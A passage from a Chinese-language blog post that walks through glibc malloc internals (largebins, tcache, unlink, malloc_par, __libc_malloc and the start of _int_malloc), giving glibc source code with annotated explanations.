   ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;&gt; 9) :\
   ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;&gt; 12) :\
   ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;&gt; 15) :\
   ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;&gt; 18) :\
   126)

#define largebin_index(sz) \
  (SIZE_SZ == 8 ? largebin_index_64 (sz)                                     \
   : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz)                     \
   : largebin_index_32 (sz))
</code></pre>
<p><img src="Heap.assets/image-20221018154602605.png" alt="image-20221018154602605"></p>
<p>largebins是一个双链的循环列表集合，每个列表都有一定范围内的空闲块。每个 arena 有63个 bigbins，每个 large bin负责容纳大小为0x400以上的空闲块。例如，一个0x400的 large bin存放大小在 0x400-0x430之间的空闲块，而一个0x2000的 large bin存放大小在0x2000-0x21f0之间的块。</p>
<p>每个大bin的头部都在它的arena中，尽管其中的后续块之间的链接是通过内联存储。当排序发生时，自由块只通过其竞技场的unsorted bin链接到其相应的 large bin。</p>
<p>large bin 是按大小顺序维护的，该 bin中最大的块可以通过bin的fd指针访问，最小的块可以通过 bk 访问。当一个块被链接到一个laege bin时，其用户数据的第一个四字节被重新用作前向指针（fd ），第二个四字节被重新用作后向指针（bk）。</p>
<p>第一个被链接到 largebin 的大小的块，其用户数据的第三个和第四个四字被重新用作跳过列表指针， 分别是fd_nextsize和bk_nextsize。这些nextsize指针形成了另一个双链接的循环列表，其中包含了链接到该bin的每个大小的第一个块。一旦其大小的第一个块被链接到一个laege bin中，随后的相同大小的块被添加到该大小的第一个块之后，以避免重新路由跳过列表。</p>
<p>在请求期间，在unsorted bin扫描之后，但在binmap搜索之前，对大小为0x400及以上的块进行 large bin 的搜索。在 large bin搜索过程中，malloc确保适当的bin拥有足够大的块来支持请求；如果是这样，则从后往前扫描bin，寻找一个完全合适或更大的块。当它是其大小的最后一个块，malloc就分配持有跳过列表指针的块，否则它就分配跳过块之后的相同大小的块，这就避免了频繁地重新路由跳过列表。</p>
<p>任何来自 large bin 的非精确拟合分配都会被耗尽或剩余，但last_remainder字段不会被设置。</p>
<h3 id="tcache-bin"><a href="#tcache-bin" class="headerlink" title="tcache bin"></a>tcache bin</h3><pre><code class="c">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */
# define TCACHE_MAX_BINS        64
# define MAX_TCACHE_SIZE    tidx2usize (TCACHE_MAX_BINS-1)

/* Only used to pre-fill the tunables.  */
# define tidx2usize(idx)    (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)

/* When &quot;x&quot; is from chunksize().  */
# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)
/* When &quot;x&quot; is a user-provided size.  */
# define usize2tidx(x) csize2tidx (request2size (x))

/* With rounding and alignment, the bins are...
   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)
   idx 1   bytes 25..40 or 13..20
   idx 2   bytes 41..56 or 21..28
   etc.  */

/* This is another arbitrary limit, which tunables can change.  Each
   tcache bin will hold at most this number of chunks.  */
# define TCACHE_FILL_COUNT 7

/* Maximum chunks in tcache bins for tunables.  This value must fit the range
   of tcache-&gt;counts[] entries, else they may overflow.  */
# define MAX_TCACHE_COUNT UINT16_MAX
</code></pre>
<pre><code class="c">/* We overlay this structure on the user-data portion of a chunk when
   the chunk is stored in the per-thread cache.  */
// 2.27
typedef struct tcache_entry
{
  struct tcache_entry *next;
} tcache_entry;

// &gt;= 2.29
typedef struct tcache_entry
{
  struct tcache_entry *next;
  /* This field exists to detect double frees.  */
  uintptr_t key;
} tcache_entry;

/* There is one of these for each thread, which contains the
   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping
   overall size low is mildly important.  Note that COUNTS and ENTRIES
   are redundant (we could have just counted the linked list each
   time), this is for performance reasons.  */
// 2.27
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;

// &gt;= 2.30
typedef struct tcache_perthread_struct
{
  uint16_t counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
</code></pre>
<p>在GLIBC主版本&gt;=2.26中，每个线程都被分配了自己的结构，称为tcache，或线程缓存。tcache 的行为就像一个 arena，但与 arena 不同的是，tcache不在线程之间共享。它们是通过在属于线程 arena 的堆上分配空间来创建的，并在线程退出时被释放。tcache的目的是缓解线程对malloc资源的争夺，给每个线程提供自己的块的集合，不与使用同一 arena 的其他线程共享 。 一个缓存的形式是一个tcache_perthread_struct，如下图11所示，它持有64个tcachebins的头部 ，前面是一个计数器阵列，记录了每个tcachebin中空闲块的数量。</p>
<p><img src="Heap.assets/image-20221020184215951.png" alt="image-20221020184215951"></p>
<p>在默认情况下，一个tcache持有大小为0x20-0x410（含） 的块。这些tcachebins的行为与fastbins类似，每个tcachebins都是一个单链的、非循环的特定大小的空闲块列表的头部。counts数组的第一个条目记录了链接到0x20 tcachebin的空闲块的 数量，第二个条目跟踪0x30 tcachebin，等等。</p>
<p>在默认情况下，tcachebin可以容纳的空闲块的数量是有限制的，这个数字在malloc_par结构中 的tcache_count字段中。当tcachebin的计数达到这个限制时，该bin大小的空闲块就会被当作没有tcache的情况下处理。例如，如果0x20 tcachebin已经满了（它持有7个空闲块），下一个 0x20大小的块将被释放到0x20 fastbin中。Malloc使用tcache的counts数组来确定bin是否已满。</p>
<p>在GLIBC版本&gt;=2.29中，链接到tcachebin的空闲块第二个的四字节被重新利用为 “key “字段，用于检测double情况。在GLIBC 2.34之前，tcache的key字段持有其tcache的地址，2.34及以后的版本使用一个随机值。</p>
<p><img src="Heap.assets/image-20221020221315361.png" alt="image-20221020221315361"></p>
<p>tcache fd 指针使用指向用户数据而不是块的元数据。</p>
<h3 id="bin-dependent"><a href="#bin-dependent" class="headerlink" title="bin dependent"></a>bin dependent</h3><pre><code class="c">/* addressing -- note that bin_at(0) does not exist */
#define bin_at(m, i) \
  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))                  \
             - offsetof (struct malloc_chunk, fd))

/* analog of ++bin */
#define next_bin(b)  ((mbinptr) ((char *) (b) + (sizeof (mchunkptr) &lt;&lt; 1)))

/* Reminders about list directionality within bins */
#define first(b)     ((b)-&gt;fd)
#define last(b)      ((b)-&gt;bk)

/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) {                                            \
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr (&quot;corrupted size vs. prev_size&quot;);                  \
    FD = P-&gt;fd;                                      \
    BK = P-&gt;bk;                                      \
    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))              \
      malloc_printerr (&quot;corrupted double-linked list&quot;);                  \
    else {                                      \
        FD-&gt;bk = BK;                                  \
        BK-&gt;fd = FD;                                  \
        if (!in_smallbin_range (chunksize_nomask (P))                  \
            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) {              \
                if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)          \
                    || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \
                          malloc_printerr (&quot;corrupted double-linked list (not small)&quot;);   \
                if (FD-&gt;fd_nextsize == NULL) {                      \
                    if (P-&gt;fd_nextsize == P)                      \
                         FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;              \
                       else {                                  \
                        FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                  \
                        FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                  \
                        P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                  \
                        P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                  \
                      }                                  \
               } else {                                  \
                       P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;              \
                    P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;              \
               }                                      \
          }                                      \
      }                                          \
}
</code></pre>
<pre><code class="c">/* Take a chunk off a bin list.  */
static void unlink_chunk (mstate av, mchunkptr p)
{
  if (chunksize (p) != prev_size (next_chunk (p)))
    malloc_printerr (&quot;corrupted size vs. prev_size&quot;);

  mchunkptr fd = p-&gt;fd;
  mchunkptr bk = p-&gt;bk;

  if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))
    malloc_printerr (&quot;corrupted double-linked list&quot;);

  fd-&gt;bk = bk;
  bk-&gt;fd = fd;
  if (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != NULL)
    {
      if (p-&gt;fd_nextsize-&gt;bk_nextsize != p
      || p-&gt;bk_nextsize-&gt;fd_nextsize != p)
    malloc_printerr (&quot;corrupted double-linked list (not small)&quot;);

      if (fd-&gt;fd_nextsize == NULL)
    {
      if (p-&gt;fd_nextsize == p)
        fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;
      else
        {
          fd-&gt;fd_nextsize = p-&gt;fd_nextsize;
          fd-&gt;bk_nextsize = p-&gt;bk_nextsize;
          p-&gt;fd_nextsize-&gt;bk_nextsize = fd;
          p-&gt;bk_nextsize-&gt;fd_nextsize = fd;
        }
    }
      else
    {
      p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;
      p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;
    }
    }
}
</code></pre>
<h3 id="alignment-dependent"><a href="#alignment-dependent" class="headerlink" title="alignment dependent"></a>alignment dependent</h3><pre><code>/* Check if m has acceptable alignment */

#define aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)

#define misaligned_chunk(p) \
  ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem (p)) \
   &amp; MALLOC_ALIGN_MASK)
</code></pre>
<h3 id="malloc-par"><a href="#malloc-par" class="headerlink" title="malloc_par"></a>malloc_par</h3><pre><code class="c">struct malloc_par
{
  /* Tunable parameters */
  unsigned long trim_threshold;
  INTERNAL_SIZE_T top_pad;
  INTERNAL_SIZE_T mmap_threshold;
  INTERNAL_SIZE_T arena_test;
  INTERNAL_SIZE_T arena_max;

  /* Memory map support */
  int n_mmaps;
  int n_mmaps_max;
  int max_n_mmaps;
  /* the mmap_threshold is dynamic, until the user sets
     it manually, at which point we need to disable any
     dynamic behavior. */
  int no_dyn_threshold;

  /* Statistics */
  INTERNAL_SIZE_T mmapped_mem;
  INTERNAL_SIZE_T max_mmapped_mem;

  /* First address handed out by MORECORE/sbrk.  */
  char *sbrk_base;

#if USE_TCACHE
  /* Maximum number of buckets to use.  */
  size_t tcache_bins;
  size_t tcache_max_bytes;
  /* Maximum number of chunks in each bucket.  */
  size_t tcache_count;
  /* Maximum number of chunks to remove from the unsorted list, which
     aren&#39;t used to prefill the cache.  */
  size_t tcache_unsorted_limit;
#endif
};

/* There is only one instance of the malloc parameters.  */

static struct malloc_par mp_ =
{
  .top_pad = DEFAULT_TOP_PAD,
  .n_mmaps_max = DEFAULT_MMAP_MAX,
  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,
  .trim_threshold = DEFAULT_TRIM_THRESHOLD,
#define NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))
  .arena_test = NARENAS_FROM_NCORES (1)
#if USE_TCACHE
  ,
  .tcache_count = TCACHE_FILL_COUNT,
  .tcache_bins = TCACHE_MAX_BINS,
  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS-1),
  .tcache_unsorted_limit = 0 /* No limit.  */
#endif
};
</code></pre>
<ul>
<li>trim_threshold：在free()中被修剪前的最大顶部块大小，默认为0x20000。</li>
<li>top_pad： 当 扩大 top_chunk 时，需要申请多少额外的内存，默认为0x20000。</li>
<li>mmap_threshold：mmap()所服务的最小块大小，默认为0x20000。</li>
<li>arena_test：默认为8。</li>
<li>arena_max：默认为0。</li>
<li>n_mmaps：当前的mmapped chunk计数，从0开始。</li>
<li>n_mmaps_max：允许的最大mmapped chunks数量，默认为0x10000。 </li>
<li>max_n_mmaps：到 目前为止并发的mmapped chunks的最高数量。</li>
<li>no_dyn_threshold：是否禁用动态 mmap threshold行为。</li>
<li>mmapped_mem：当前有多少内存被mmapped。</li>
<li>max_mmapped_mem：一次性存在的最高mmapped内存量。</li>
<li>sbrk_base：由sbrk发放的1个st 地址。</li>
<li>tcache_bins： 要使用的tcache bins的数量，默认为0x40。</li>
<li>tcache_max_bytes：tcache chunks支持的最大用户数据，默认为0x408。</li>
<li>tcache_count：每个 tcachebin 中的最大块数，默认 7。</li>
<li>unsorted_limit：填充 tcache 时的最大 unsortedbin 迭代次数。</li>
</ul>
<h3 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><pre><code class="c">/*
  malloc(size_t n)
  Returns a pointer to a newly allocated chunk of at least n bytes, or null
  if no space is available. Additionally, on failure, errno is
  set to ENOMEM on ANSI C systems.

  If n is zero, malloc returns a minumum-sized chunk. (The minimum
  size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit
  systems.)  On most systems, size_t is an unsigned type, so calls
  with negative arguments are interpreted as requests for huge amounts
  of space, which will often fail. The maximum supported value of n
  differs across systems, but is in all cases less than the maximum
  representable value of a size_t.
*/
void *__libc_malloc(size_t bytes) {
    mstate ar_ptr; // arena
    void *victim; // 所返回的堆块

    // 读取 __malloc_hook 钩子, 如果有值，则运行钩子函数并返回
    void *(*hook)(size_t, const void *)
    = atomic_forced_read(__malloc_hook);
    if (__builtin_expect(hook != NULL, 0))
        return (*hook)(bytes, RETURN_ADDRESS (0));

    // 使用 tchache 的情况
#if USE_TCACHE
    /* int_free also calls request2size, be careful to not pad twice.  */
    size_t tbytes;

    // 判断请求分配字节的大小
    // 计算 bytes 数据需要分配的内存大小，当 bytes 数据的大小比最小 chunk 要还小时,
    // 按最小 chunk 的大小分配；当 bytes 数据的大小比最小 chunk 大时，则分配满足内存
    // bytes最大不超过(unsigned long) (INTERNAL_SIZE_T) (-2 * MINSIZE)
    checked_request2size (bytes, tbytes);
    // 计算 tbytes 大小所对应的 tcache 下标
    size_t tc_idx = csize2tidx (tbytes);
    // 如果 tcache 还没有被创建，则调用 tcache_init() 初始化 tcache
    MAYBE_INIT_TCACHE ();

    DIAG_PUSH_NEEDS_COMMENT;

    // 如果 tc_idx 在 tcache bins 的范围内
    // 且 tcache 存在
    // 且 tc_idx 对应的 entry 不为空 即 有空闲的 tcache chunk
    if (tc_idx &lt; mp_.tcache_bins
        /*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */
        &amp;&amp; tcache
        &amp;&amp; tcache-&gt;entries[tc_idx] != NULL)
      {
        // 返回相应的 tcache chunk
        return tcache_get (tc_idx);
      }
    DIAG_POP_NEEDS_COMMENT;
#endif

    // 没有启用多线程的情况
    if (SINGLE_THREAD_P) {
        // 调用 _int_malloc 获取 chunk
        victim = _int_malloc(&amp;main_arena, bytes);
        // 满足以下 3 个条件任意一个即可返回
        // 1. victim 为空
        // 2. victim 是从 mmap 分配的
        // 3. victim 是从主分配区（main_arena）分配的
        assert(!victim || chunk_is_mmapped (mem2chunk(victim)) ||
               &amp;main_arena == arena_for_chunk (mem2chunk(victim)));
        return victim;
    }

    // 启用多线程的情况
    // 获取当前的 arena
    arena_get (ar_ptr, bytes);

    // 调用 _int_malloc 获取 chunk
    victim = _int_malloc(ar_ptr, bytes);
    /* Retry with another arena only if we were able to find a usable arena
       before.  */
    // 如果未成功获取 arena, 或者没有分配 chunk
    if (!victim &amp;&amp; ar_ptr != NULL) {
        LIBC_PROBE(memory_malloc_retry, 1, bytes);
        // 再次尝试
        ar_ptr = arena_get_retry(ar_ptr, bytes);
        victim = _int_malloc(ar_ptr, bytes);
    }

    // 释放线程锁
    if (ar_ptr != NULL)
        __libc_lock_unlock(ar_ptr-&gt;mutex);

    // 满足以下 3 个条件任意一个即可返回
    // 1. victim 为空
    // 2. victim 是从 mmap 分配的
    // 3. victim 是从主分配区（main_arena）分配的
    assert(!victim || chunk_is_mmapped (mem2chunk(victim)) ||
           ar_ptr == arena_for_chunk (mem2chunk(victim)));
    return victim;
}
</code></pre>
<h4 id="MAYBE-INIT-TCACHE"><a href="#MAYBE-INIT-TCACHE" class="headerlink" title="MAYBE_INIT_TCACHE"></a>MAYBE_INIT_TCACHE</h4><pre><code class="c">#if USE_TCACHE
...
static __thread bool tcache_shutting_down = false;
static __thread tcache_perthread_struct *tcache = NULL;
...
# define MAYBE_INIT_TCACHE() \
  if (__glibc_unlikely (tcache == NULL)) \
    tcache_init();

#else  /* !USE_TCACHE */

# define MAYBE_INIT_TCACHE()

static void
tcache_thread_shutdown(void) {
    /* Nothing to do if there is no thread cache.  */
}

#endif /* !USE_TCACHE  */
</code></pre>
<pre><code class="c">static void tcache_init(void)
{
  mstate ar_ptr;
  void *victim = 0;
  // 计算 tcahce_perthread_struct 结构体的大小
  const size_t bytes = sizeof (tcache_perthread_struct);

  // 如果 tcache 被禁用，直接返回
  if (tcache_shutting_down)
    return;

  // 给 tcache 分配相应的内存
  arena_get (ar_ptr, bytes);
  victim = _int_malloc (ar_ptr, bytes);
  if (!victim &amp;&amp; ar_ptr != NULL)
    {
      ar_ptr = arena_get_retry (ar_ptr, bytes);
      victim = _int_malloc (ar_ptr, bytes);
    }


  if (ar_ptr != NULL)
    __libc_lock_unlock (ar_ptr-&gt;mutex);

  /* In a low memory situation, we may not be able to allocate memory
     - in which case, we just keep trying later.  However, we
     typically do this very early, so either there is sufficient
     memory, or there isn&#39;t enough memory to do non-trivial
     allocations anyway.  */
  if (victim)
    {
      // 给 tcache 赋值
      tcache = (tcache_perthread_struct *) victim;
      // 将 tcache 处的内存初始化为 0
      memset (tcache, 0, sizeof (tcache_perthread_struct));
    }
}
</code></pre>
<pre><code class="c">static void tcache_thread_shutdown (void)
{
  int i;
  tcache_perthread_struct *tcache_tmp = tcache;
  // tcache 不存在直接返回
  if (!tcache)
    return;

  /* Disable the tcache and prevent it from being reinitialized.  */
  // 禁用 tcache 并防止它被重新初始化
  tcache = NULL;
  tcache_shutting_down = true;

  /* Free all of the entries and the tcache itself back to the arena
     heap for coalescing.  */
  // 将所有条目和 tcache 本身释放回 arena 以进行合并
  for (i = 0; i &lt; TCACHE_MAX_BINS; ++i)
    {
      while (tcache_tmp-&gt;entries[i])
    {
      tcache_entry *e = tcache_tmp-&gt;entries[i];
      tcache_tmp-&gt;entries[i] = e-&gt;next;
      __libc_free (e);
    }
    }

  __libc_free (tcache_tmp);
}
</code></pre>
<h4 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get"></a>tcache_get</h4><pre><code class="c">/* Caller must ensure that we know tc_idx is valid and there&#39;s
   available chunks to remove.  */
static __always_inline void * tcache_get (size_t tc_idx)
{
  // 取出 tc_idx 所对应的链表
  tcache_entry *e = tcache-&gt;entries[tc_idx];
  assert (tc_idx &lt; TCACHE_MAX_BINS);
  assert (tcache-&gt;entries[tc_idx] &gt; 0);
  // 取出第一个
  tcache-&gt;entries[tc_idx] = e-&gt;next;
  // 对应的 tcache_count - 1
  --(tcache-&gt;counts[tc_idx]);
  // 返回 chunk
  return (void *) e;
}
</code></pre>
<h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h3><pre><code class="c">static void *_int_malloc(mstate av, size_t bytes) {
    INTERNAL_SIZE_T nb;               /* normalized request size */
    unsigned int idx;                 /* associated bin index */
    mbinptr bin;                      /* associated bin */

    mchunkptr victim;                 /* inspected/selected chunk */
    INTERNAL_SIZE_T size;             /* its size */
    int victim_index;                 /* its bin index */

    mchunkptr remainder;              /* remainder from a split */
    unsigned long remainder_size;     /* its size */

    unsigned int block;               /* bit map traverser */
    unsigned int bit;                 /* bit map traverser */
    unsigned int map;                 /* current word of binmap */

    mchunkptr fwd;                    /* misc temp for linking */
    mchunkptr bck;                    /* misc temp for linking */

#if USE_TCACHE
    size_t tcache_unsorted_count;        /* count of unsorted chunks processed */
#endif

    /*
       Convert request size to internal form by adding SIZE_SZ bytes
       overhead plus possibly more to obtain necessary alignment and/or
       to obtain a size of at least MINSIZE, the smallest allocatable
       size. Also, checked_request2size traps (returning 0) request sizes
       that are so large that they wrap around zero when padded and
       aligned.
     */

    // 检查请求大小是否合规
    // 计算 bytes 数据需要分配的内存大小，当 bytes 数据的大小比最小 chunk 要还小时,
    // 按最小 chunk 的大小分配；当 bytes 数据的大小比最小 chunk 大时，则分配满足内存
    // bytes最大不超过(unsigned long) (INTERNAL_SIZE_T) (-2 * MINSIZE)
    checked_request2size (bytes, nb);

    /* There are no usable arenas.  Fall back to sysmalloc to get a chunk from
       mmap.  */
    // 如果没有可用的分配区，则调用 sysmalloc 获取 chunk
    if (__glibc_unlikely(av == NULL)) {
        void *p = sysmalloc(nb, av);
        if (p != NULL)
            /*
             *  static int perturb_byte;

                static void
                alloc_perturb(char *p, size_t n) {
                    if (__glibc_unlikely(perturb_byte))
                        memset(p, perturb_byte ^ 0xff, n);
                }

             */
            //将 p 全部设置为 perturb_byte ,默认什么也不做
            alloc_perturb(p, bytes);
        return p;
    }

    /*
       If the size qualifies as a fastbin, first check corresponding bin.
       This code is safe to execute even if av is not yet initialized, so we
       can try it without checking, which saves some time on this fast path.
     */

#define REMOVE_FB(fb, victim, pp)            \
  do                            \
    {                            \
      victim = pp;                    \
      if (victim == NULL)                \
    break;                        \
    }                            \
  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \
     != victim);                    \
    // catomic_compare_and_exchange_val_rel_acq 功能是 如果*fb等于victim，则将*fb存储为victim-&gt;fd，返回victim；
    // 其作用是从刚刚得到的空闲chunk链表指针中取出第一个空闲的chunk(victim)，并将链表头设置为该空闲chunk的下一个chunk(victim-&gt;fd)

    // 如果规范化后的大小 小于等于 fast bins 中的最大 chunk 大小
    if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast())) {
        // 在 fastbin 中拿到相应的索引
        idx = fastbin_index (nb);
        // 取得对应 fastbin 中的第一个 chunk
        mfastbinptr *fb = &amp;fastbin (av, idx);
        mchunkptr pp;
        victim = *fb;

        // 如果该 fastbin 中有值
        if (victim != NULL) {
            // 如果是单线程
            if (SINGLE_THREAD_P)
                // 取出 victim
                *fb = victim-&gt;fd;
            else
                // 取出 victim
                REMOVE_FB (fb, pp, victim);
            // victim 不为空
            if (__glibc_likely(victim != NULL)) {
                // 计算 victim 所对应的 fastbin 索引
                size_t victim_idx = fastbin_index (chunksize(victim));
                // 所分配给的 victim 的 victim_idx 要和 刚开始计算出的 idx 相等
                if (__builtin_expect(victim_idx != idx, 0))
                    malloc_printerr(&quot;malloc(): memory corruption (fast)&quot;);
                // 啥也没干
                check_remalloced_chunk (av, victim, nb);
// 如果使用 tcache
#if USE_TCACHE
                /* While we&#39;re here, if we see other chunks of the same size,
               stash them in the tcache.  */
                // 取得对应大小的 tcache idx
                size_t tc_idx = csize2tidx (nb);
                // 检查 tcache
                if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)
              {
                mchunkptr tc_victim;

                /* While bin not empty and tcache not full, copy chunks.  */
                // tc_idx 所对应的 entry 未满， 且相应大小的 fastbin 还有值
                // 就把 fastbin 中的值移至 tcache bin 中，直到 tcache 已满
                while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count
                   &amp;&amp; (tc_victim = *fb) != NULL)
                  {
                    if (SINGLE_THREAD_P)
                        *fb = tc_victim-&gt;fd;
                    else
                  {
                    REMOVE_FB (fb, pp, tc_victim);
                    if (__glibc_unlikely (tc_victim == NULL))
                      break;
                  }
                    // 将 fast bin 中的 chunk 插入 tcache bin 中
                    tcache_put (tc_victim, tc_idx);
                  }
              }
#endif
                // 拿到用户指针
                void *p = chunk2mem (victim);
                // 将 p 全部设置为 perturb_byte ,默认什么也不做
                alloc_perturb(p, bytes);
                // 返回
                return p;
            }
        }
    }

    /*
       If a small request, check regular bin.  Since these &quot;smallbins&quot;
       hold one size each, no searching within bins is necessary.
       (For a large request, we need to wait until unsorted chunks are
       processed to find best fit. But for small ones, fits are exact
       anyway, so we can check now, which is faster.)
     */
    // 如果规范化后的大小 在 samllbin 的序列之中
    if (in_smallbin_range (nb)) {
        // 拿到 相应的索引
        idx = smallbin_index (nb);
        // 在 arena 上找到相应的位置
        bin = bin_at (av, idx);
        // 表明 该 bin 中有值
        if ((victim = last (bin)) != bin) {
            // 拿到 victim 的 bk
            bck = victim-&gt;bk;
            // 验证
            if (__glibc_unlikely(bck-&gt;fd != victim))
                malloc_printerr(&quot;malloc(): smallbin double linked list corrupted&quot;);
            /*
              #define set_inuse_bit_at_offset(p, s)                          \
              (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size |= PREV_INUSE)
            */
            // 设置 victim 物理相邻的下一个 chunk 的 prev_inuse 位
            set_inuse_bit_at_offset (victim, nb);
            // 拿出 victim
            bin-&gt;bk = bck;
            bck-&gt;fd = bin;

            // 设置 non_main_arena
            if (av != &amp;main_arena)
                set_non_main_arena (victim);

            // 啥也没干
            check_malloced_chunk (av, victim, nb);

            // 和之前的一样
            // 如果对应的 tcache bin 未满， 则将 small bin 中的值一个一个的移过去
            // 直至对应的 tcache bin 已满
#if USE_TCACHE
            /* While we&#39;re here, if we see other chunks of the same size,
               stash them in the tcache.  */
            size_t tc_idx = csize2tidx (nb);
            if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)
              {
                mchunkptr tc_victim;

                /* While bin not empty and tcache not full, copy chunks over.  */
                while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count
                   &amp;&amp; (tc_victim = last (bin)) != bin)
              {
                if (tc_victim != 0)
                  {
                    bck = tc_victim-&gt;bk;
                    set_inuse_bit_at_offset (tc_victim, nb);
                    if (av != &amp;main_arena)
                  set_non_main_arena (tc_victim);
                    bin-&gt;bk = bck;
                    bck-&gt;fd = bin;

                    tcache_put (tc_victim, tc_idx);
                      }
              }
              }
#endif
            void *p = chunk2mem (victim);
            alloc_perturb(p, bytes);
            return p;
        }
    }

        /*
           If this is a large request, consolidate fastbins before continuing.
           While it might look excessive to kill all fastbins before
           even seeing if there is space available, this avoids
           fragmentation problems normally associated with fastbins.
           Also, in practice, programs tend to have runs of either small or
           large requests, but less often mixtures, so consolidation is not
           invoked all that often in most programs. And the programs that
           it is called frequently in otherwise tend to fragment.
         */
        // 就剩 large bin 了
    else {
        idx = largebin_index (nb);
        // 如果该 arena 中存在 fastbin 则调用 malloc_consolidate 合并
        if (atomic_load_relaxed(&amp;av-&gt;have_fastchunks))
            malloc_consolidate(av);
    }

    /*
       Process recently freed or remaindered chunks, taking one only if
       it is exact fit, or, if this a small request, the chunk is remainder from
       the most recent non-exact fit.  Place other traversed chunks in
       bins.  Note that this step is the only place in any routine where
       chunks are placed in bins.

       The outer loop here is needed because we might not realize until
       near the end of malloc that we should have consolidated, so must
       do so and retry. This happens at most once, and only when we would
       otherwise need to expand memory to service a &quot;small&quot; request.
     */

#if USE_TCACHE
    INTERNAL_SIZE_T tcache_nb = 0;
    //获取 nb 对应大小的 tcache 的 idx
    size_t tc_idx = csize2tidx (nb);
    //  tcache 存在且下标 idx 在范围内
    if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)
      tcache_nb = nb;
    int return_cached = 0;

    tcache_unsorted_count = 0;
#endif

    // 处理 unsorted bin
    for (;;) {
        int iters = 0;
        // unsorted bin 中有值，且不是 arena 本身
        while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))
        {
            // 从 bk 开始
            bck = victim-&gt;bk;
            // victim 的 大小 不能小于 2 * SIZE_SZ
            // 且不能大于 av-&gt;system_mem
            if (__builtin_expect(chunksize_nomask (victim) &lt;= 2 * SIZE_SZ, 0)
                || __builtin_expect(chunksize_nomask (victim)
                                    &gt; av-&gt;system_mem, 0))
                malloc_printerr(&quot;malloc(): memory corruption&quot;);
            // 计算该块 标准化 后的大小
            size = chunksize (victim);

            /*
               If a small request, try to use last remainder if it is the
               only chunk in unsorted bin.  This helps promote locality for
               runs of consecutive small requests. This is the only
               exception to best-fit, and applies only when there is
               no exact fit for a small chunk.
             */
            //  如果请求的大小在 smallbin 序列之中
            //  unsorted bin 中只有这一个 chunk
            // 并且该 victim 是 last remainder chunk
            // 且该块的大小要大于请求的大小加 MINSIZE
            if (in_smallbin_range (nb) &amp;&amp;
                bck == unsorted_chunks (av) &amp;&amp;
            victim == av-&gt;last_remainder &amp;&amp;
            (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE))
            {
                /* split and reattach remainder */
                // 切割 remainder
                remainder_size = size - nb;
                remainder = chunk_at_offset (victim, nb);
                // 把切割后的 remainder 加入 unsorted bin 中
                unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;
                // 记录新值
                av-&gt;last_remainder = remainder;
                // 进行链接
                remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);
                // 如果 remainder_size 的值在 large bin 中
                if (!in_smallbin_range (remainder_size)) {
                    // fd_nextsize,fd_nextsize清零
                    remainder-&gt;fd_nextsize = NULL;
                    remainder-&gt;bk_nextsize = NULL;
                }
                // #define set_head(p, s)       ((p)-&gt;mchunk_size = (s)
                // 设置 victim 的 size 标志位
